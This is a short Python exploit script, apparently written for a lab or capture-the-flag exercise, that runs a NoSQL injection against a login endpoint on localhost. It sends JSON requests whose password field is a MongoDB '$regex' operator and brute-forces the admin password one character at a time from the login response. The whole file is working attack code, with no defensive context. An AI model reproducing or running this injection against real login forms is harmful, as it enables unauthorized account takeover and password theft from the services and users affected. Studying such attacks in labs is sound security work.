#!/usr/bin/pyhton3

from pwn import *
import requests, time, sys, signal, string

# funtions
def def_handler(sig,frame):
    print("\n\n[!] Quitting...")

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# globals
login_url="http://localhost:4000/user/login"
characters=string.ascii_lowercase + string.ascii_uppercase + string.digits

# fun
def makeNoSQLI():
    password = ""
    p1 = log.progress("Brute force")
    p1.status("[INFO] Starting brute force...")
    time.sleep(2)
    p2 = log.progress("Password")
    for position in range(0,24):
        for character in characters:
            post_data = '{"username":"admin","password": {"$regex":"^%s%s"}}' % (password,character)
            p1.status(post_data)
            # print(post_data)
            headers = {"Content-Type": "Application/json"}
            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

# main
if __name__ == "__main__":
    makeNoSQLI()